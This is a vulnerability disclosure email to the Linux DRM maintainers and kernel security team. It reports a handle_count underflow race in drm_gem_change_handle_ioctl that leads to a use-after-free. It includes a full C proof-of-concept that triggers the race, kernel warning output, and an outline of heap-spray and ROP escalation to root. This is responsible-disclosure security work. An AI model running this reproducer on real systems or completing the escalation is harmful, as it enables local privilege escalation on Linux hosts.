Return-Path: <dri-devel-bounces@lists.freedesktop.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id E9E8ECD5BD1
	for <dri-devel@archiver.kernel.org>; Tue, 26 May 2026 20:30:52 +0000 (UTC)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id E232C10E652;
	Tue, 26 May 2026 20:30:46 +0000 (UTC)
Authentication-Results: gabe.freedesktop.org;
	dkim=pass (1024-bit key; unprotected) header.d=tencent.com header.i=@tencent.com header.b="nE8QMQtG";
	dkim-atps=neutral
X-Greylist: delayed 475 seconds by postgrey-1.36 at gabe;
 Tue, 26 May 2026 09:11:18 UTC
Received: from bg5.exmail.qq.com (bg5.exmail.qq.com [43.154.155.102])
 by gabe.freedesktop.org (Postfix) with ESMTPS id 39EA610E1A5
 for <dri-devel@lists.freedesktop.org>; Tue, 26 May 2026 09:11:18 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=tencent.com;
 s=s201512; t=1779786667;
 bh=1FrIvHynujdIaEvpHhFx2PSHxSJhHvZRzNOyjjxCJh4=;
 h=Date:Subject:From:To:Message-ID:Mime-version;
 b=nE8QMQtGvR821XZ4WRLSMiDIVn+e52vrMUkkVQ39HotXzAOHdMGqhUIh43XursZf7
 9LvY1LoHaSxC0C1FmMX1x8+KkmJHtihKOK1wsr9+ZpjY+0ot2Z1hCncCnVxKK7i7g9
 ROL2spdm89JEy5WBDYLihuKuETiUoa9Iz54HzIDg=
X-QQ-mid: zesmtpsz1t1779786169te081134b
X-QQ-Originating-IP: TaaPOE7fmCB8z3H9BFtdBAXCNXV2KNszCea4v7E4C+o=
Received: from [10.78.44.100] ( [21.36.98.133])
 by bizesmtp.qq.com (ESMTP) with 
 id ; Tue, 26 May 2026 17:02:46 +0800 (CST)
X-QQ-SSF: 0000000000000000000000000000000
X-QQ-GoodBg: 0
X-BIZMAIL-ID: 8691782478644320060
User-Agent: Microsoft-MacOutlook/16.109.26051717
Date: Tue, 26 May 2026 17:02:45 +0800
Subject: Security: handle_count underflow in drm_gem_change_handle_ioctl,
 leading to use-after-free
From: "=?gb18030?B?eGxhYmFp?=" <xlabai@tencent.com>
To: <maarten.lankhorst@linux.intel.com>, <mripard@kernel.org>,
 <tzimmermann@suse.de>
CC: <security@kernel.org>, <dri-devel@lists.freedesktop.org>,
 "xlab(=?UTF-8?B?TUlH5a6J5YWo5a6e6aqM5a6k?=)" <xlab@tencent.com>
Message-ID: <61E60951F9DE2D29+59E7E080-B725-486B-83F2-5F3398F8FE80@tencent.com>
Thread-Topic: Security: handle_count underflow in drm_gem_change_handle_ioctl, 
 leading to use-after-free
Mime-version: 1.0
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: quoted-printable
X-QQ-SENDSIZE: 520
Feedback-ID: zesmtpsz:tencent.com:qybglogicsvrgz:qybglogicsvrgz5b-1
X-QQ-XMAILINFO: MenZI4DvrogNcjgiiuipn7f6uFRfAhMW7WOl7uhMbDf9ozYXDEKXpRdr
 AffFTClV54L8JYytPcjETy9jPRmBOUUMseQIf+n7bQQt0yNGgUAt2WMY++zN9qw74X5Mjif
 nQXhJCgN7v6a2oE0O1yjq9YloYoVSQPk6FtvpiyhW1o6bIDthDW64SX5IIrwkV9XiRW8zkg
 3m1LwSFIUbwUr5IHX2VgHR69Fs8KvFO4LUfStXwOn2V+x/3JnxSQajxJUY0/jaxIrnTOVgX
 IGxxD+Rma6/EqZeNHsLRXBMl4cGFnDWoiqNiuzZJgJnEqGNCQsrke35Bxx/PQLeagB+x0uY
 t18+ifBNixuujUu/lFLsjznAYFFL7TkJ57ahmff0t3K4QBl2Nioy+zuqkiIoV4PkZCEHMXc
 tJKpRX/nMSJHStgwCfr0xab5plF7ebhSroH1PrvWSyo04iJbnyxNn8ozEaxKT6xn7DuVrfs
 GaMZcJzorlT9N7Zo6qgG7Noymq2A0XUjwa8VSpkm5Eujv2Ew63NvNQEo7KIJCf+Ak/jvxJB
 ua+m/bENDi2K3JwWx/jJMflPkcYTiATyeBFqApvPVlrF/2w+nV3CJ/twkT4jW7I2z8hQ5X2
 swa/YPXkYJv11fGYk+jPy74ryr1w8FkIsNy9SDV48MneZebQv1Rb77G5BFb66Vc550A4XfJ
 efgTPqGQfBbwrRPVR2KHWtbtKEA++yJplurQ8uNBtGoNH09NFvM62DsmH4DPHVy/KExDLQZ
 U2UN32jYAmK6IMi83isL+HPUAmoGAWVAI9BMVIn0m+6mFApjV67jFtoGq/aSjRtud5MQaer
 iUve/fsae5s8uo5hHtTyNqGxbK3NR6/6tgjMAGsrgsEEjkVo+sFdzOlV2jHR48apd2T6AOo
 D+T/EpTpIJk3+S90LjYcikjHB0N0bA6E3joWhcGqDNuUSOdPiDPYjyIydHqbDXDpZ8ecj/M
 mRBLfHBtloie4MeAslUXG8Vn4PlW6ypTQDOfZmA3udD5CIiPf5HiTgXOg9b+NH0pvI0PWwn
 eraZIsxgsgHig9KaNrGlkzNn52M30=
X-QQ-XMRINFO: MSVp+SPm3vtSI1QTLgDHQqIV1w2oNKDqfg==
X-QQ-RECHKSPAM: 0
X-Mailman-Approved-At: Tue, 26 May 2026 20:30:45 +0000
X-BeenThere: dri-devel@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Direct Rendering Infrastructure - Development
 <dri-devel.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/dri-devel>
List-Post: <mailto:dri-devel@lists.freedesktop.org>
List-Help: <mailto:dri-devel-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=subscribe>
Errors-To: dri-devel-bounces@lists.freedesktop.org
Sender: "dri-devel" <dri-devel-bounces@lists.freedesktop.org>

Hi,

We found a use-after-free caused by a handle_count underflow race in
drm_gem_change_handle_ioctl. The old handle remains live in the IDR
during the lock-gap between spin_unlock(&table_lock) and the subsequent
spin_lock(&table_lock), allowing a concurrent GEM_CLOSE on the same
handle to decrement handle_count to 0 and free the GEM object while the
new handle still references it in the IDR. On drivers with a .close
callback (i915, amdgpu, nouveau), the subsequent close of the dangling
new handle dereferences a freed vtable pointer at offset 624, enabling
function pointer hijack for local privilege escalation.

## Affected versions

Verified on Linux v7.1.0-rc4 (arm64, CONFIG_DRM=3Dy, CONFIG_DRM_VGEM=3Dy).

Introduced:      v7.1-rc3  commit 5e28b7b94408 ("drm: Set old handle to
                           NULL before prime swap in change_handle")
Feature origin:  v6.18     commit 53096728b891 ("drm: Add DRM prime
                           interface to reassign GEM handle")
Latest affected: v7.1-rc4 (current mainline)

The race was introduced by 5e28b7b94408 which attempted to fix a
different concurrency issue with change_handle but left the old handle
live in the IDR during the lock-gap.

## Description

drm_gem_change_handle_ioctl performs a "move" operation: it allocates a
new IDR slot for the GEM object and removes the old one. The operation
drops table_lock between setting up the new handle placeholder and
completing the move (to perform prime bookkeeping under prime.lock).

During this window (drivers/gpu/drm/drm_gem.c, between line 1068 and
line 1085), IDR[old_handle] still contains obj. A concurrent
drm_gem_handle_delete(old_handle) can:

  1. Acquire table_lock, idr_replace the old handle with NULL, release
     table_lock =E2=80=94 this succeeds because the old handle is still live.
  2. Call drm_gem_object_release_handle, which blocks on prime.lock
     (held by change_handle).
  3. After change_handle completes and releases prime.lock, the blocked
     delete finishes: it calls drm_gem_object_handle_put_unlocked,
     decrementing handle_count from 1 to 0.
  4. handle_count =3D=3D 0 triggers the final drm_gem_object_put, freeing
     the object. But IDR[new_handle] still points to it.

change_handle treats the operation as a rename =E2=80=94 it never increments
handle_count for the new handle, and never decrements it for the old
handle. The concurrent delete's decrement produces a net underflow.

The WARNING at drm_gem.c:340 (the WARN_ON(handle_count =3D=3D 0) guard in
drm_gem_object_handle_put_unlocked) fires on each race win, confirming
the underflow.

## Impact

  - handle_count underflow to 0: triggers premature object free while
    IDR[new_handle] still references the object.

  - UAF on GEM object (drm_gem_shmem_object, 720 bytes, kmalloc-1024):
    subsequent GEM_CLOSE on the dangling new handle dereferences freed
    memory including obj->funcs vtable pointer at offset 624.

  - Function pointer hijack: on DRM drivers with a .close callback
    (i915, amdgpu, nouveau), obj->funcs->close(obj, file_priv) is
    called from freed/resprayed memory =E2=80=94 attacker-controlled function
    pointer execution in kernel context.

  - Local privilege escalation: heap spray of kmalloc-1024 with
    controlled data overwrites obj->funcs, enabling ROP/JOP chain to
    commit_creds(prepare_kernel_cred(0)).

## Conditions

  - CONFIG_DRM=3Dy (enabled on all desktop/server distro kernels)
  - Any DRM driver providing GEM objects (VGEM, i915, amdgpu, etc.)
  - DRM render node access (/dev/dri/renderD* =E2=80=94 typically mode 0666 on
    desktop Linux, or video/render group membership)
  - No capabilities required
  - Two threads sharing the same DRM fd (pthread_create or fork)
  - Architecture independent (verified on arm64)

## Suspected location

  drivers/gpu/drm/drm_gem.c:
    - drm_gem_change_handle_ioctl: spin_unlock(&table_lock) at ~line 1068
      opens the race window; old handle remains in IDR
    - drm_gem_object_handle_put_unlocked (~line 340): WARN_ON fires when
      handle_count =3D=3D 0 due to concurrent close during the lock-gap
    - drm_gem_handle_delete (~line 400): concurrent delete succeeds on old
      handle while change_handle holds only prime.lock

## Reproducer

Build:  gcc -o trigger_v3 trigger_v3.c -static -lpthread
Run:    ./trigger_v3 [iterations]  (default: 20000)
Kernel: v7.1-rc3+ with CONFIG_DRM=3Dy, CONFIG_DRM_VGEM=3Dy
Result: 5 races won in ~1300 iterations (0.38% hit rate) on arm64 QEMU
        (2 vCPU, HVF acceleration)

Each race win triggers WARNING at drm_gem.c:340 confirming handle_count
underflow. The PoC uses PRIME export (DRM_IOCTL_PRIME_HANDLE_TO_FD) to
widen the race window by forcing change_handle through the
drm_prime_add_buf_handle path.

Verified on arm64.

Kernel output (dmesg, fires on each race win):

  WARNING: drivers/gpu/drm/drm_gem.c:340 at drm_gem_object_handle_put_unloc=
ked+0x23c/0x34c, CPU#1: trigger_v3/61
  CPU: 1 UID: 0 PID: 61 Comm: trigger_v3 Not tainted 7.1.0-rc4 #2 PREEMPTLA=
ZY
  Call trace:
   drm_gem_object_handle_put_unlocked+0x23c/0x34c (P)
   drm_gem_object_release_handle+0xa0/0x208
   drm_gem_handle_delete+0x64/0xb0
   drm_gem_close_ioctl+0xc4/0x114
   drm_ioctl_kernel+0x128/0x2ac
   drm_ioctl+0x478/0xa38
   __arm64_sys_ioctl+0x578/0x10cc

--- trigger_v3.c ---
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <stdatomic.h>
#include <sched.h>

#ifndef FUTEX_WAIT
#define FUTEX_WAIT 0
#define FUTEX_WAKE 1
#endif

struct drm_mode_create_dumb {
    uint32_t height;
    uint32_t width;
    uint32_t bpp;
    uint32_t flags;
    uint32_t handle;
    uint32_t pitch;
    uint64_t size;
};

struct drm_gem_close {
    uint32_t handle;
    uint32_t pad;
};

struct drm_gem_change_handle {
    uint32_t handle;
    uint32_t new_handle;
};

struct drm_prime_handle {
    uint32_t handle;
    uint32_t flags;
    int32_t fd;
};

#define DRM_IOCTL_MODE_CREATE_DUMB   _IOWR('d', 0xB2, struct drm_mode_creat=
e_dumb)
#define DRM_IOCTL_GEM_CLOSE          _IOW('d', 0x09, struct drm_gem_close)
#define DRM_IOCTL_GEM_CHANGE_HANDLE  _IOWR('d', 0xD2, struct drm_gem_change=
_handle)
#define DRM_IOCTL_PRIME_HANDLE_TO_FD _IOWR('d', 0x2D, struct drm_prime_hand=
le)
#define DRM_RDWR 0x02

static int futex_wait(int *addr, int val) {
    return syscall(SYS_futex, addr, FUTEX_WAIT, val, NULL, NULL, 0);
}
static int futex_wake(int *addr, int count) {
    return syscall(SYS_futex, addr, FUTEX_WAKE, count, NULL, NULL, 0);
}

struct race_ctx {
    int drm_fd;
    uint32_t old_handle;
    uint32_t new_handle;
    int barrier __attribute__((aligned(4)));
    int change_ret;
    int close_ret;
};

static void *thread_change(void *arg) {
    struct race_ctx *ctx =3D arg;
    struct drm_gem_change_handle ch =3D {
        .handle =3D ctx->old_handle,
        .new_handle =3D ctx->new_handle,
    };
    __atomic_add_fetch(&ctx->barrier, 1, __ATOMIC_SEQ_CST);
    futex_wait(&ctx->barrier, 1);
    ctx->change_ret =3D ioctl(ctx->drm_fd, DRM_IOCTL_GEM_CHANGE_HANDLE, &ch);
    if (ctx->change_ret < 0) ctx->change_ret =3D -errno;
    return NULL;
}

static void *thread_close(void *arg) {
    struct race_ctx *ctx =3D arg;
    struct drm_gem_close cl =3D { .handle =3D ctx->old_handle };
    __atomic_add_fetch(&ctx->barrier, 1, __ATOMIC_SEQ_CST);
    futex_wait(&ctx->barrier, 2);
    ctx->close_ret =3D ioctl(ctx->drm_fd, DRM_IOCTL_GEM_CLOSE, &cl);
    if (ctx->close_ret < 0) ctx->close_ret =3D -errno;
    return NULL;
}

static int find_drm(void) {
    char path[64];
    for (int i =3D 0; i < 16; i++) {
        snprintf(path, sizeof(path), "/dev/dri/card%d", i);
        int fd =3D open(path, O_RDWR);
        if (fd >=3D 0) { printf("[+] %s\n", path); return fd; }
    }
    return -1;
}

int main(int argc, char *argv[]) {
    int max_iters =3D 20000;
    if (argc > 1) max_iters =3D atoi(argv[1]);

    printf("=3D=3D=3D DRM GEM change_handle Race v3 (KASAN trigger) =3D=3D=3D\n");

    int fd =3D find_drm();
    if (fd < 0) { fprintf(stderr, "[-] No DRM device\n"); return 1; }

    int wins =3D 0;
    for (int i =3D 0; i < max_iters; i++) {
        struct drm_mode_create_dumb create =3D {
            .height =3D 1, .width =3D 64, .bpp =3D 32,
        };
        if (ioctl(fd, DRM_IOCTL_MODE_CREATE_DUMB, &create) < 0) {
            usleep(1000);
            continue;
        }

        /* PRIME export to widen race window AND add kref complexity */
        struct drm_prime_handle prime =3D {
            .handle =3D create.handle, .flags =3D DRM_RDWR,
        };
        ioctl(fd, DRM_IOCTL_PRIME_HANDLE_TO_FD, &prime);
        if (prime.fd >=3D 0) close(prime.fd);

        uint32_t new_handle =3D 50000 + (i % 40000);

        struct race_ctx ctx =3D {
            .drm_fd =3D fd,
            .old_handle =3D create.handle,
            .new_handle =3D new_handle,
            .barrier =3D 0,
        };

        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread_change, &ctx);
        pthread_create(&t2, NULL, thread_close, &ctx);

        while (__atomic_load_n(&ctx.barrier, __ATOMIC_SEQ_CST) < 2)
            sched_yield();
        __atomic_store_n(&ctx.barrier, 3, __ATOMIC_SEQ_CST);
        futex_wake(&ctx.barrier, 2);

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        int both_ok =3D (ctx.change_ret =3D=3D 0 && ctx.close_ret =3D=3D 0);

        if (both_ok) {
            wins++;
            printf("[!!!] RACE WON iter=3D%d wins=3D%d\n", i, wins);

            /*
             * At this point:
             * - handle_count was decremented to 0 by the concurrent close
             * - The object MAY be freed (kref reached 0)
             * - IDR[new_handle] still points to the object
             *
             * Give the kernel time to fully process the free.
             * Then trigger the UAF by closing new_handle.
             */
            usleep(10000);  /* 10ms =E2=80=94 let slab free complete */

            /* Close the dangling new_handle =E2=86=92 UAF access in release_hand=
le */
            struct drm_gem_close uaf =3D { .handle =3D new_handle };
            int r =3D ioctl(fd, DRM_IOCTL_GEM_CLOSE, &uaf);
            printf("    UAF close: %d (%s)\n", r, r < 0 ? strerror(errno) :=
 "ok");

            if (wins >=3D 5) break;
            continue;
        }

        /* Cleanup */
        if (ctx.change_ret =3D=3D 0) {
            struct drm_gem_close cl =3D { .handle =3D new_handle };
            ioctl(fd, DRM_IOCTL_GEM_CLOSE, &cl);
        } else if (ctx.close_ret !=3D 0) {
            struct drm_gem_close cl =3D { .handle =3D create.handle };
            ioctl(fd, DRM_IOCTL_GEM_CLOSE, &cl);
        }

        if (i % 1000 =3D=3D 0 && i > 0)
            printf("[*] iter=3D%d wins=3D%d\n", i, wins);
    }

    printf("\n=3D=3D=3D Results: %d races won in %d iters =3D=3D=3D\n", wins, max_iters=
);
    close(fd);
    return wins > 0 ? 0 : 1;
}
--- end trigger_v3.c ---

## Fix

We have submitted a patch via git-send-email:

  Message-ID: <20260526085313.26791-1-kipreyyy@gmail.com>

## Credit

This vulnerability was discovered by:

  - XlabAI Team of Tencent Xuanwu Lab (xlabai@tencent.com)
  - Atuin Automated Vulnerability Discovery Engine
  - Zhenghang Xiao (kipreyyy@gmail.com)
  - Guannan Wang (wgnbuaa@gmail.com)
  - Zhanpeng Liu (pkugenuine@gmail.com)
  - Jiashuo Liang (761232680@qq.com)
  - Guancheng Li (lgcpku@gmail.com)

CVE and credits are preferred.

If you have any questions regarding the vulnerability details, please
feel free to reach out to us for further discussion. Our email address
is xlabai@tencent.com.

We follow the security industry standard disclosure policy -- the 90+30
policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-d=
isclosure-policy.html).
If the aforementioned vulnerabilities cannot be fixed within 90 days of
submission, we reserve the right to publicly disclose all information
about the issues after this timeframe.


